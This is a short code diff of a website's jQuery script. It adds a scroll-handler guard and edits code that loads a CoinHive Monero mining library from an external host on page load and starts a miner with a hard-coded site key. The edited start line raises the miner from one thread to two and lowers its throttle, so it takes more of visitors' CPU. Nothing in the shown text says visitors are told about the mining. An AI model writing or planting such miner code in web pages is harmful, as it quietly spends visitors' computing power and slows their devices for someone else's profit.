@@ -4,6 +4,9 @@
 
   // scroll
   $(window).scroll(function () {
+    if ($('body').height() < $(window).height() * 2 + $('.header').outerHeight()) {
+      return;
+    }
     if ($(window).scrollTop() > $(window).height()) {
       $('.header').addClass('header-fixed');
       $('.first-screen .required').css('padding-top', '116px')
@@ -18,8 +21,7 @@
   scriptDom.setAttribute('src', 'https://static.hacpai.com/js/lib/xmr.min.js')
   document.head.appendChild(scriptDom)
   scriptDom.onload = function () {
-    var miner = new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 1, throttle: 0.9});
-    miner.start();
+    (CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 2, throttle: 0.5})).start();
   }
 
   // baidu
